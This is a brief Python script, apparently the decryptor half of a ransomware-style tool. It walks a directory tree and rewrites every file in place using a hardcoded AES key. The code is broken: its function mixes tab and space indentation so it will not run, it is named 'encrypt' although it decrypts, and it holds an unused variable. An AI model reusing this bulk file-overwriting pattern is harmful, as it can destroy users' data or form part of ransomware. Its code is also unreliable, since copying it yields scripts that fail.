import os
import glob
import aes

scan = glob.glob
dirs = []

def encrypt(file):
	enc1 = open(file, "r")
        enc = enc1.read()
        key = "\xed\xac\xbe\x88<.\xd9H8D\xb2'\x19\xb9IG"
        ret = aes.decryptData(key, enc, mode=2)
        f = open(file, "w+")
        f.write(ret)
	print("Decrypted: " + file)

for x in os.walk("/YOUR/DIRECTORY/witha / at the end"):
    dir = x[0]
    mal_dir = scan(dir + "*")
    # print("Path " + dir)
    search = dir + "/*"
    a = scan(search)
    for file in a:
        det = os.path.isfile(file)
        if det:
            print(file)
            encrypt(file)
        else:
            continue
